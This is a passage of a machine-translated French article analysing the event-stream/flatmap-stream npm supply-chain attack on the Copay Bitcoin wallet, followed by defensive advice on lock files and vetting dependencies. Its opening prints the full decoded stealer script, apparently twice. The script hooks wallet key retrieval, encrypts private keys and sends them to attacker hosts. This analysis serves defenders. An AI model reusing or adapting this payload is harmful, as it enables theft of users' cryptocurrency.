class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end() } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>); n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span> } i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.getFile(t, { <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span> }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader; t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result)) }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ t.abort() }, t.readAsText(e) }) }) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t])) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } } global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t]; <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t))) }.bind(n)) } }); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e() }();</code> \\ nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C \\ nDXUs / peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj \\ nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW + / BiGud7b77Fwfq372fUuEIk \\ N2P / pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762 \\ nPDBMwQsCKQcpKDXw / 6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz \\ nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl / cj / x76To \\ n2wIDAQAB \ <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>), a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>), c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{ e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({ <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e, <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>, <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>, <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t, <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: { <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length, <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span> } }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{}); r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end() } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>); n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span> } i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.getFile(t, { <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span> }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader; t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result)) }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ t.abort() }, t.readAsText(e) }) }) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t])) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } } global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t]; <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t))) }.bind(n)) } }); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e() }();</code> </pre> <br><p>  Comme vous l'avez peut-être deviné, ce script tente de voler votre portefeuille Bitcoin et de télécharger ses données sur le serveur de l'attaquant. </p><br><p>  <em>Mise à jour:</em> l'équipe npm a publié son <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rapport d'incident officiel</a> , qui expliquait que le code malveillant était destiné à être lancé dans le processus de publication de Copay afin d'injecter un script de vol de bitcoins dans le code de l'application de portefeuille Copay. </p><br><p>  Donc, pour résumer </p><br><ul><li>  La plateforme de bitcoin populaire <code>copay-dash</code> utilise la dépendance du flux d'événements. </li><li>  En septembre, pendant environ une semaine, le flux d'événements a contenu une dépendance de flux plat, car le projet a été transféré à un nouveau développeur qui a ajouté la dépendance et l'a supprimée une semaine plus tard. </li><li>  flatmap-stream contenait un fragment caché à la fin du code minifié, qui tentait de décoder les lignes du <code>test/data.js</code> , en utilisant la description du package racine comme clé AES256. </li><li>  Pour tout package normal, cela a provoqué une erreur (car la description du package n'était pas la bonne clé), qui a été traitée en silence.  Mais pour copay-dash, le déchiffrement a donné un code JavaScript valide, qui a lancé une autre étape de déchiffrement et exécuté un script malveillant qui vole votre portefeuille bitcoin. </li></ul><br><h2 id="chto-teper-delat">  Que faire maintenant? </h2><br><p>  Il s'agissait d'une attaque étonnamment rusée, rappelant fortement un article de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">janvier</a> , avec une description d'une attaque hypothétique similaire.  L'attaquant a habilement balayé ses traces - le code et l'historique des commits sur Github montrent une situation inoffensive et non suspecte (le nouveau développeur rejoint le projet, ajoute une fonctionnalité, puis modifie légèrement sa mise en œuvre).  En plus des signes suspects dans le flatmap-stream (nouveau package, aucun contributeur et statistiques de téléchargement), l'attaque s'est avérée presque invisible.  Et en fait, il n'a pas été détecté pendant 2 mois et n'a été trouvé que maintenant parce que l'attaquant a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">fait une petite erreur en</a> utilisant la méthode <code>crypto.createDecipher</code> obsolète au lieu de <code>crypto.createDecipheriv</code> , ce qui a provoqué un message suspect concernant l'utilisation de la méthode obsolète dans une autre bibliothèque, ce qui utilise le flux d'événements. </p><br><p>  Malheureusement, ce type d'attaque ne nous quittera pas dans un avenir proche.  JavaScript est le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">langage</a> le plus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">populaire</a> à l'heure actuelle, ce qui signifie qu'il restera une cible attrayante pour les pirates.  JavaScript a également relativement peu de fonctionnalités dans la bibliothèque standard par rapport à d'autres langages, ce qui oblige les développeurs à utiliser les packages de npm - ainsi que d'autres facteurs culturels, cela conduit au fait que les projets JavaScript ont généralement une énorme arborescence de dépendances. </p><br><p>  Il convient de noter que bien que les applications JavaScript soient plus sujettes à cette classe de vulnérabilités, ce n'est pas nécessairement la raison pour laquelle JavaScript est moins sécurisé en général.  JavaScript est généralement utilisé par les développeurs plus actifs qui essaient d'être sur la vague du progrès, c'est-à-dire que leurs utilisateurs installent plus de packages et de mises à jour, y compris des correctifs de sécurité.  Dans le même temps, l'application Java d'Equifax a été piratée pour la raison opposée exacte - ils <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">n'ont pas installé de mises à jour de sécurité pour Apache Struts</a> pendant des mois.  Ce type de vulnérabilité est moins probable dans les applications JavaScript.  Au final, lors du choix d'une pile technologique pour une entreprise, la question de la sécurité se pose toujours.  Une leçon importante sera de comprendre les scénarios d'attaque possibles pour votre décision particulière et la capacité de les anticiper. </p><br><p>  Qu'est-ce que cela signifie pour la pile javascript?  Les idées et suggestions ne manquent pas sur la manière dont le NPM ou d'autres communautés pourraient empêcher de telles attaques.  Mais pour les utilisateurs finaux, il existe au moins deux étapes de base pour réduire vos risques: </p><br><ul><li><p>  <strong>Utilisez des fichiers de verrouillage</strong> .  Peu importe que ce soit yarn.lock ou package-lock.json, tout fichier de verrouillage garantit que vous recevrez les mêmes versions de packages à chaque installation, c'est-à-dire que si vous êtes en sécurité aujourd'hui, vous resterez le même demain.  Les applications qui pratiquent des dépendances flottantes sans utiliser de fichiers de verrouillage sont particulièrement vulnérables aux mises à jour malveillantes, car elles installent automatiquement la dernière version disponible des dépendances, c'est-à-dire que vous pouvez être compromis avec chaque déploiement après qu'une de vos dépendances a été compromise et publiée version avec vulnérabilité.  Avec les fichiers de verrouillage, vous limiterez au moins vos risques aux actions manuelles des développeurs qui ajoutent et mettent à jour des packages, qui peuvent être revérifiées par la révision du code ou d'autres politiques de l'entreprise. </p><br></li><li><p>  <strong>Réfléchissez avant de mettre quelque chose</strong> .  Comme indiqué ci-dessus, ce n'est pas une panacée, les pirates peuvent toujours passer à travers des signets en code minifié qui sont difficiles à trouver, même si vous savez qu'ils sont là.  Mais pas moins, vous pouvez réduire vos risques si vous vous en tenez aux packages populaires et activement pris en charge.  Avant d'installer une nouvelle dépendance, demandez-vous d'abord si vous en avez vraiment besoin.  Si vous savez déjà comment écrire du code et qu'il ne prend pas plus d'une douzaine de lignes, écrivez-le vous-même.  Si vous avez toujours besoin d'une dépendance, évaluez-la avant l'installation.  Combien de téléchargements a-t-elle sur npm?  Le référentiel sur Github a-t-il l'air activement mis à jour?  Le package a-t-il été mis à jour récemment?  Sinon, envisagez de le bifurquer et de l'utiliser.  Cela réduira les risques, car vous ne serez pas exposé à de futures mises à jour dangereuses, vous pourrez lire et réduire le code source vous-même et être sûr qu'il contient et qu'il contient. </p><br></li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr431360/">https://habr.com/ru/post/fr431360/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr431344/index.html">Acoustique intégrée: qu'est-ce que c'est et comment ça marche</a></li>
<li><a href="../fr431346/index.html">Développement d'une application compatible avec l'action pour Slack</a></li>
<li><a href="../fr431348/index.html">Anycubic Photon: un mini-aperçu d'une imprimante 3D photopolymère peu coûteuse</a></li>
<li><a href="../fr431350/index.html">Plans de développement du processeur électronique Baïkal</a></li>
<li><a href="../fr431354/index.html">Le premier codec vidéo d'apprentissage automatique a considérablement surpassé tous les codecs existants, y compris H.265 et VP9</a></li>
<li><a href="../fr431362/index.html">Comment un designer peut-il se débarrasser de la routine et garder son intérêt pour son travail?</a></li>
<li><a href="../fr431370/index.html">Les rapports les plus rapides dans l'ouest sauvage. Et une poignée de bugs en plus ...</a></li>
<li><a href="../fr431372/index.html">Interruptions à partir de périphériques externes dans un système x86. Partie 2. Options de démarrage du noyau Linux</a></li>
<li><a href="../fr431374/index.html">Jugement dernier: analyse des indicateurs financiers du jeu en accès anticipé</a></li>
<li><a href="../fr431376/index.html">Migration des données dans l'entreprise sanglante: quoi analyser pour ne pas submerger le projet</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
